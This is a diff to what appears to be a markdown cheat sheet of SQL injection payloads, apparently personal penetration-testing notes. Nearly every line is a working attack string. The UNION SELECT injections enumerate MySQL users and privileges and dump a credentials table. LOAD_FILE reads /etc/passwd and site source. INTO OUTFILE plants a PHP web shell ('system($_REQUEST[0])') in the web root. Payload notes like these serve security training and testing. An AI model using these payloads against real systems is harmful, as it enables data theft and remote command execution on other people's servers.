@@ -623,7 +623,13 @@ cn' UNION select 1, username, password, 4 from dev.credentials-- -
 
 ```
 SHOW GRANTS;
+SELECT USER()
 cn' UNION SELECT 1, user(), 3, 4-- -
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+cn' UNION SELECT 1, user(), 3, 4-- -
+SELECT super_priv FROM mysql.user
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
 cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
@@ -632,7 +638,9 @@ cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.glo
 - SQL File Injection
 
 ```
+SELECT LOAD_FILE('/etc/passwd');
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 select 'file written successfully!' into outfile '/var/www/html/proof.txt'
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
